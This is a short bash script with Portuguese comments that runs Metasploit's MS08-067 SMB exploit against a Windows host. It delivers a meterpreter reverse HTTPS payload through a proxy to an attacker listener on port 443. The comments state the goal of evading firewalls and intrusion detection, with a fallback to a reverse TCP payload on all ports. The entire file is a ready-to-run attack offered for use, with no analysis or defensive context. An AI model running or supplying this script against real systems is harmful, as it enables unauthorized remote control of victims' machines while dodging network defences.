#!/bin/bash

#burlar portas, no firewall e ids caso 443
#grep -i reverse_https search payload
#se falhar tental reverse_tcp_allports

msfconsole -x "use exploit/windows/smb/ms08_067_netapi;
set RHOST 192.168.0.4;
set PAYLOAD windows/meterpreter/reverse_https_proxy;
set LHOST 192.168.0.6;
set LPORT 443;
set HttpProxyHost 192.123.123.12;
set HttpProxyPort 7113;
set HttpProxyuser 131231231;
set HttpProxyPass 123;
run"

